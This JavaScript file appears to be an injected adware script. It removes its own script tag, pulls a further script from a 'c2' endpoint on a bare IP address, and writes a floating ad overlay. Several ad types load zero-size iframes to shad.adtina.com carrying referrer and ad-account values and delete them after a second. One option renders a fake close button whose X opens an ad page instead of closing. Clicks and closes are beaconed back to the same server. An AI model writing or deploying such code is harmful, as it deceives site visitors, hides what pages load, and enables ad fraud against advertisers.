var ts = new Date().getTime();
var c2_params_pc = assembleC2Para_PC();

var sc = document.getElementsByTagName("script");
var node = sc[sc.length - 1];
node.parentNode.removeChild(node);

var psurl = "http://180.96.26.130:8073/c2?"+c2_params_pc;
document.write("<script type='text/javascript' src='" + psurl + "'><\/script>");
var ainfo = "";
function psda(resobj) {
	ainfo = resobj;

	if (ainfo.showFlag == "0") {
		recordShow("1", ainfo.adId, ainfo.ref);
	} else {
		adShow(ainfo.width, ainfo.height, ainfo.userId, ainfo.adId, ainfo.ref);
		recordShow("0", "0", ainfo.ref);
	}
}

function recordShow(showType, adId, ref) {

	var timestamp = new Date().getTime();
	var click_img = new Image(1, 1);
	click_img.src = "http://180.96.26.130:8073/showad?showType=" + showType
			+ "&ref=" +ref+ "&adId=" + adId + "&impId=" + ainfo.impId
			+ "&area=" + ainfo.area + "&_=" + timestamp;

}

function adShow(width, height, userId, adId, ref) {
	if (ainfo.linkType == "J") {
		document.write(ainfo.extLink);
		document
				.write('<iframe id="jframe"  src="http://shad.adtina.com/ad/'
						+ ainfo.userId
						+ '/'
						+ ainfo.adId
						+ '?adforcerReferer='
						+ ainfo.ref
						+ '&ad_acct='
						+ ainfo.adAcct
						+ '" width="0px" height="0px" border="0"   marginwidth="0" marginheight="0"  frameborder="0" hspace="0" scrolling="no" vspace="0" ></iframe>');

		var jframe = document.getElementById("jframe");
		setTimeout("jframe.parentNode.removeChild(jframe)", 1000);
		return;
	} 

	document.write('<div id="addiv" style="position: fixed; Z-INDEX: 9200; right: 0px; bottom: 0px;width: '
					+ ainfo.width + 'px;height: ' + ainfo.height + 'px">');
	if (ainfo.closeType == '0') {
		document.write('<img  src="http://img.alimama.cn/p/close1.gif" onclick="closeAdDiv();" onmouseover="this.src=\'http://img.alimama.cn/p/close2.gif\'" onmouseout="this.src=\'http://img.alimama.cn/p/close1.gif\'" style="height:13px;font-size:14px;float:right;width:43px;cursor:pointer;position:absolute;top:-16px;right:0">');
	} else if (ainfo.closeType == '1') {
		document.write('<div id="close" style="POSITION: absolute; Z-INDEX: 9500; border:none; RIGHT: 4px;"> ');
		document.write('<input type="button" value="X" onclick="closeAdDiv();" style="cursor:pointer; background-color: transparent; border:0; font-weight:bold; color:#3C3C3C; font-size:14px; font-family:Arial;"/>');
		document.write('</div>');
	} else if (ainfo.closeType == '2') {
		document.write('<div id="close" style="POSITION: absolute; Z-INDEX: 9500; border:none; RIGHT: 4px;"> ');
		document.write('<input type="button" value="X" onclick="closeDeadAdDiv();" style="cursor:pointer; background-color: transparent; border:0; font-weight:bold; color:#3C3C3C; font-size:14px; font-family:Arial;"/>');
		document.write('<form style="margin:0px;padding:0px;" id="deadForm" method="get" action="/deadx" target="_blank"><input type="hidden" name="adId" value="'
						+ ainfo.adId + '" /></form>');
		document.write('</div>');
	} else if (ainfo.closeType == 'R') {
		var ts = new Date().getTime();
		if (ts % 2 == 0) {
			document.write('<img  src="http://img.alimama.cn/p/close1.gif" onclick="closeAdDiv();" onmouseover="this.src=\'http://img.alimama.cn/p/close2.gif\'" onmouseout="this.src=\'http://img.alimama.cn/p/close1.gif\'" style="height:13px;font-size:14px;float:right;width:43px;cursor:pointer;position:absolute;top:-16px;right:0">');
		} else {
			document.write('<div id="close" style="POSITION: absolute; Z-INDEX: 9500; border:none; RIGHT: 4px;"> ');
			document.write('<input type="button" value="X" onclick="closeAdDiv();" style="cursor:pointer; background-color: transparent; border:0; font-weight:bold; color:#3C3C3C; font-size:14px; font-family:Arial;"/>');
			document.write('</div>');
		}
	}

	if (ainfo.linkType == 'M') {
		document.write('<iframe  src="http://shad.adtina.com/ad/'
						+ ainfo.userId
						+ '/'
						+ ainfo.adId
						+ '?adforcerReferer='
						+ ainfo.ref
						+ '&ad_acct='
						+ ainfo.adAcct
						+ '" width="'
						+ ainfo.width
						+ 'px" height="'
						+ ainfo.height
						+ 'px" border="0"   marginwidth="0" marginheight="0"  frameborder="0" hspace="0" scrolling="no" vspace="0" ></iframe>');

	} else if (ainfo.linkType == 'E') {
		if (ainfo.extLink != '') {
			document.write('<iframe  id="extframe" src="'
							+ ainfo.extLink
							+ '" width="'
							+ ainfo.width
							+ 'px" height="'
							+ ainfo.height
							+ 'px" border="0"   marginwidth="0" marginheight="0"  frameborder="0" hspace="0" scrolling="no" vspace="0" ></iframe>');
			document.write('<iframe  id="eframe" src="http://shad.adtina.com/ad/'
							+ ainfo.userId
							+ '/'
							+ ainfo.adId
							+ '?adforcerReferer='
							+ ainfo.ref
							+ '&ad_acct='
							+ ainfo.adAcct
							+ '" width="0px" height="0px" border="0"   marginwidth="0" marginheight="0"  frameborder="0" hspace="0" scrolling="no" vspace="0" ></iframe>');

			if (document.getElementById("extframe")) {
				IframeOnClick.track(
								document.getElementById("extframe"),
								function(e) {

									// 通过Image对象请求后端脚本
									var args = getArgs();
									var click_img = new Image(1, 1);
									click_img.src = "http://180.96.26.130:8900/statclick?"
											+ args + "&pos=extframe";
								});
			}

			var eframe = document.getElementById("eframe");
			setTimeout("eframe.parentNode.removeChild(eframe)", 1000);

		}

	} else if (ainfo.linkType == 'L') {
		document.write(ainfo.extLink);
		document.write('<iframe id="lframe"  src="http://shad.adtina.com/ad/'
						+ ainfo.userId
						+ '/'
						+ ainfo.adId
						+ '?adforcerReferer='
						+ ainfo.ref
						+ '&ad_acct='
						+ ainfo.adAcct
						+ '" width="0px" height="0px" border="0"   marginwidth="0" marginheight="0"  frameborder="0" hspace="0" scrolling="no" vspace="0" ></iframe>');

		var lframe = document.getElementById("lframe");
		setTimeout("lframe.parentNode.removeChild(lframe)", 1000);
	}
	document.write('</div>');
}


function getArgs() {
	var params = {};
	params.adId = ainfo.adId || '';
	params.materialId = '';
	params.impuuid = '';
	params.referrer = ainfo.ref || '';

	var timestamp = new Date().getTime();
	params.ts = timestamp || '';
	// 拼接参数串
	var args = '';
	for ( var i in params) {
		if (args != '') {
			args += '&';
		}
		args += i + '=' + encodeURIComponent(params[i]);
	}
	return args;
}


function assembleC2Para_PC() {
	var params = {};
	params.adforcerReferer = nullOrUndefined2Empt(src_url);
	params.rus = nullOrUndefined2Empt(rus);
	params.divda = nullOrUndefined2Empt(divda);
	params.ptey = nullOrUndefined2Empt(ptey);
	params.area = nullOrUndefined2Empt(area);
	params.rus = nullOrUndefined2Empt(rus);
	params.adType = "0";
	
	var timestamp = new Date().getTime();
	params.ts = timestamp || '';
	// 拼接参数串
	var args = '';
	for ( var i in params) {
		if (args != '') {
			args += '&';
		}
		args += i + '=' + encodeURIComponent(params[i]);
	}
	return args;
	
	
	return params;
}

//不是死叉时,关闭按钮
function closeAdDiv() {
	document.getElementById("addiv").innerHTML = '';
	document.getElementById("addiv").style.visibility = 'hidden';
	document.getElementById("addiv").style.display = 'none';
	
	 var args = getArgs();
	 var close_img = new Image(1, 1);
	 close_img.src = "http://180.96.26.130:8040/statclose?" + args
	
}

//如果是死叉,直接进入ssp,查询对应的目标连接,在进行跳转
function closeDeadAdDiv() {
	
	document.getElementById('deadForm').submit();
	document.getElementById("addiv").innerHTML = '';
	document.getElementById("addiv").style.visibility = 'hidden';
	document.getElementById("addiv").style.display = 'none';
	
	//统计点击率:
    var args = getArgs();
    var click_img = new Image(1, 1);
    click_img.src = "http://180.96.26.130:8040/statclick?" + args + "&pos=death";
}

function nullOrUndefined2Empt(str) {
	if (typeof (str) == "undefined" || str == null) {
		return "";
	} else {
		return str;
	}
}

